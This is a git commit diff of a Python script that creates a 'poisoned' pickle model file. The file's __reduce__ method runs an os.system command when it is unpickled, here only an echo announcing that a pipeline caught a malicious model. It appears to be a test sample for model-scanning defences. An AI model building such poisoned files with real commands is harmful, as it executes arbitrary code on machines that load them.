993caa561e317c7c39879a199fa9d6669a0a7d46
A7 <86871401+ItsA7@users.noreply.github.com>
2026-03-11 15:43:56 +0530

    Update poison.py

--- poison.py
+++ poison.py
@@ -2,18 +2,17 @@ import pickle
 import os
 
 # This class defines the "Poison"
-# When a victim opens this file, it will run 'echo HACKED'
 class Poison:
     def __reduce__(self):
-        # This is the "Magic" method that tells Python what to do when loading
+        # This tells the computer to run a command when the file is opened
         return (os.system, ('echo YOUR PIPELINE JUST CAUGHT A MALICIOUS MODEL!',))
 
 # Create the poisoned object
 malicious_model = Poison()
 
-# Save it as a .pkl file
-with name = 'poisoned_model.pkl'
-with open(name, 'wb') as f:
+# Save it correctly
+file_name = 'poisoned_model.pkl'
+with open(file_name, 'wb') as f:
     pickle.dump(malicious_model, f)
 
-print(f"Poisoned model created: {name}")
+print(f"Poisoned model created successfully: {file_name}")
